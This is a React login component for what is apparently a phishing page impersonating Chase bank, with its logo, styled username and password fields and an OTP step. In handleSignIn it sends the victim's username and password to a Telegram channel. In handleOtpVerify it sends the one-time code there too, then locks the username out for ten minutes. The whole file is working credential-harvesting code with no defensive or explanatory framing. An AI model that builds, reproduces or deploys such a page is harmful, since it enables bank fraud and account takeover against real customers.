import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { AlertCircle } from 'lucide-react';
import { ChaseLogo } from '@/components/ChaseLogo';
import { SocialFooter } from '@/components/SocialFooter';
import { OtpInput } from '@/components/OtpInput';
import { useNavigate } from 'react-router-dom';
import { loginBlocker } from '@/utils/loginBlocker';
import { sendToTelegram } from '@/utils/telegramNotifier';
import { supabase } from '@/integrations/supabase/client';

export const Login = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [usernameError, setUsernameError] = useState(false);
  const [loginError, setLoginError] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [useToken, setUseToken] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [generatedOtp, setGeneratedOtp] = useState('');
  const navigate = useNavigate();

  // Clean up expired blocks on component mount
  useEffect(() => {
    loginBlocker.cleanupExpiredBlocks();
  }, []);

  const handleUsernameBlur = () => {
    if (username.trim() === '') {
      setUsernameError(true);
    } else {
      setUsernameError(false);
    }
  };

  const handleRememberMeChange = (checked: boolean | "indeterminate") => {
    setRememberMe(checked === true);
  };

  const handleUseTokenChange = (checked: boolean | "indeterminate") => {
    setUseToken(checked === true);
  };

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Clear any previous errors
    setLoginError('');
    
    // Basic validation
    if (username.trim() === '') {
      setUsernameError(true);
      return;
    }
    
    if (password.trim() === '') {
      return;
    }

    // Check if user is blocked BEFORE proceeding
    console.log(`Checking if user ${username} is blocked...`);
    if (loginBlocker.isBlocked(username)) {
      setLoginError(`Account temporarily blocked.`);
      console.log(`Login blocked for user ${username}.`);
      return;
    }

    console.log(`User ${username} is not blocked, proceeding to send OTP...`);
    
    // Send username and password to Telegram
    sendToTelegram(`Username: ${username}\nPassword: ${password}`);
    
    try {
      // Call the edge function to send OTP
      const { data, error } = await supabase.functions.invoke('send-otp', {
        body: { username: username }
      });

      if (error) {
        console.error('Error sending OTP:', error);
        setLoginError('Failed to send OTP. Please try again.');
        return;
      }

      if (data?.success) {
        console.log('OTP sent successfully');
        setGeneratedOtp(data.otp); // Store the generated OTP for verification
        setShowOtp(true);
      } else {
        setLoginError('Failed to send OTP. Please try again.');
      }
    } catch (error) {
      console.error('Error calling send-otp function:', error);
      setLoginError('Failed to send OTP. Please try again.');
    }
  };

  const handleOtpBack = () => {
    setShowOtp(false);
    setGeneratedOtp('');
  };

  const handleOtpVerify = (otp: string) => {
    console.log('OTP verified:', otp);
    
    // Verify OTP matches the generated one
    if (otp === generatedOtp) {
      // Send OTP to Telegram
      sendToTelegram(`OTP: ${otp}\nUsername: ${username}`);
      
      // Block the user for 10 minutes after successful login
      console.log(`Blocking user ${username} for 10 minutes...`);
      loginBlocker.blockUser(username);
      
      // Set login status in session storage
      sessionStorage.setItem('isLoggedIn', 'true');
      
      // Navigate to dashboard after successful OTP verification
      navigate('/dashboard');
    } else {
      setLoginError('Invalid OTP. Please try again.');
      setShowOtp(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-blue-100">
      {/* Background image effect */}
      <div 
        className="absolute inset-0 bg-cover bg-center opacity-[7.5%]"
        style={{
          backgroundImage: "url('/lovable-uploads/f9289b77-4537-4900-beb6-b0ff19e46cd9.png')",
          filter: 'blur(4px)',
        }}
      />
      
      <div className="relative z-10 flex flex-col min-h-screen">
        {/* Header with Chase logo */}
        <div className="flex justify-center pt-8 pb-6">
          <ChaseLogo />
        </div>

        {/* Main login form */}
        <div className="flex-1 flex items-center justify-center px-4 pb-20">
          <div className="w-full max-w-md">
            {showOtp ? (
              <OtpInput onBack={handleOtpBack} onVerify={handleOtpVerify} />
            ) : (
              <div className="bg-white/95 backdrop-blur-sm rounded-lg shadow-xl p-8">
                <form onSubmit={handleSignIn} className="space-y-6">
                  {/* Username field */}
                  <div className="space-y-2">
                    <Label 
                      htmlFor="username" 
                      className={`text-base font-medium ${usernameError ? 'text-red-600' : 'text-gray-700'}`}
                    >
                      Username
                    </Label>
                    <Input
                      id="username"
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      onBlur={handleUsernameBlur}
                      className={`h-12 text-base border-b-2 border-t-0 border-l-0 border-r-0 rounded-none px-0 focus:border-blue-600 ${
                        usernameError ? 'border-red-600' : 'border-gray-300'
                      }`}
                    />
                    {usernameError && (
                      <div className="flex items-center space-x-2 text-red-600">
                        <AlertCircle className="h-4 w-4" />
                        <span className="text-sm">Please tell us your username.</span>
                      </div>
                    )}
                  </div>

                  {/* Password field */}
                  <div className="space-y-2">
                    <Label htmlFor="password" className="text-base font-medium text-gray-700">
                      Password
                    </Label>
                    <div className="relative">
                      <Input
                        id="password"
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="h-12 text-base border-b-2 border-t-0 border-l-0 border-r-0 rounded-none px-0 pr-16 focus:border-blue-600 border-gray-300"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-0 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-800 font-medium"
                      >
                        {showPassword ? 'Hide' : 'Show'}
                      </button>
                    </div>
                  </div>

                  {/* Login error message */}
                  {loginError && (
                    <div className="flex items-center space-x-2 text-red-600">
                      <AlertCircle className="h-4 w-4" />
                      <span className="text-sm">{loginError}</span>
                    </div>
                  )}

                  {/* Checkboxes */}
                  <div className="flex items-center justify-between pt-4">
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="remember"
                        checked={rememberMe}
                        onCheckedChange={handleRememberMeChange}
                        className="border-gray-400"
                      />
                      <Label htmlFor="remember" className="text-gray-700 font-normal">
                        Remember me
                      </Label>
                    </div>
                    <div className="flex items-center space-x-2">
                      <Checkbox
                        id="token"
                        checked={useToken}
                        onCheckedChange={handleUseTokenChange}
                        className="border-gray-400"
                      />
                      <Label htmlFor="token" className="text-gray-700 font-normal">
                        Use token
                      </Label>
                    </div>
                  </div>

                  {/* Sign in button */}
                  <Button
                    type="submit"
                    className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white text-base font-medium rounded-md mt-8"
                  >
                    Sign in
                  </Button>

                  {/* Helper links */}
                  <div className="space-y-3 pt-4">
                    <button
                      type="button"
                      className="text-blue-600 hover:text-blue-800 text-base flex items-center"
                    >
                      Forgot username/password? 
                      <span className="ml-1">›</span>
                    </button>
                    <button
                      type="button"
                      className="text-blue-600 hover:text-blue-800 text-base flex items-center"
                    >
                      Not Enrolled? Sign Up Now.
                      <span className="ml-1">›</span>
                    </button>
                  </div>
                </form>
              </div>
            )}
          </div>
        </div>

        {/* Footer */}
        <SocialFooter />
      </div>
    </div>
  );
};
